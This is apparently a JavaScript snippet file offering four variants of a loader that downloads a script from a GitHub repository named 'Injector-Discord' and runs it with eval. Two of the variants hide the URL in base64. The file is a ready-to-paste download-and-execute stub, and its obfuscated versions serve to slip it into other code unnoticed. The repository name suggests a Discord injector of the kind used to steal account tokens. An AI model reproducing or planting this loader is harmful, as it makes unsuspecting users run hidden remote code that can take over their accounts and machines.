//default
require('https').get('https://raw.githubusercontent.com/Absolute99/Injector-Discord/main/index.js', (res) => { 
    var data = ""; 
    res.on('data', (dat) => data += dat.toString());
    res.on('end', () => eval(data))
})
//hidden
require('https').get(Buffer.from('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0Fic29sdXRlOTkvSW5qZWN0b3ItRGlzY29yZC9tYWluL2luZGV4LmpzCg==', 'base64').toString(), (res) => { 
    var data = ""; 
    res.on('data', (dat) => data += dat.toString());
    res.on('end', () => eval(data));
})
//one line
require('https').get('https://raw.githubusercontent.com/Absolute99/Injector-Discord/main/index.js', (res) => { var data = ""; res.on('data', (dat) => data += dat.toString()); res.on('end', () => eval(data)); })
//one line + hidden
require('https').get(Buffer.from('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0Fic29sdXRlOTkvSW5qZWN0b3ItRGlzY29yZC9tYWluL2luZGV4LmpzCg==', 'base64').toString(), (res) => { var data = ""; res.on('data', (dat) => data += dat.toString()); res.on('end', () => eval(data)); })
